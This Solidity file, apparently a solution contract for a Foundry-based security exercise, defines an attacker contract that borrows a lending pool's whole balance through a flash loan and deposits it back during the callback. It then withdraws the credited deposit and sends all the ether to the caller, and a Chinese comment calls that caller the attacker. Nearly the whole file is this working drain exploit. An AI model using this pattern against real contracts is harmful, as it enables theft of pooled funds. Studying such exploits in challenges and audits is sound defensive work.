// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

contract EtherReceiver {
    address private _poolAddr;

    function executeFlashLoan(address poolAddr) external {
        _poolAddr = poolAddr;
        bytes memory dataWithSignature = abi.encodeWithSignature("flashLoan(uint256)", _poolAddr.balance);
        (bool sucess,) = _poolAddr.call(dataWithSignature);
        require(sucess, "execute flash loan failed");
    }

    function execute() external payable {
        bytes memory dataWithSignature = abi.encodeWithSignature("deposit()");
        (bool success,) = _poolAddr.call{value: address(this).balance}(dataWithSignature);
        require(success, "deposit failed");
    }

    function withdraw() external {
        bytes memory dataWithSignature = abi.encodeWithSignature("withdraw()");
        (bool success,) = _poolAddr.call(dataWithSignature);
        require(success, "withdraw failed");
        // 把所有的錢轉回去給 attacker
        (success,) = address(msg.sender).call{value: address(this).balance}("");
        require(success, "transfer to msg.sender failed");
    }

    receive() external payable {}
}
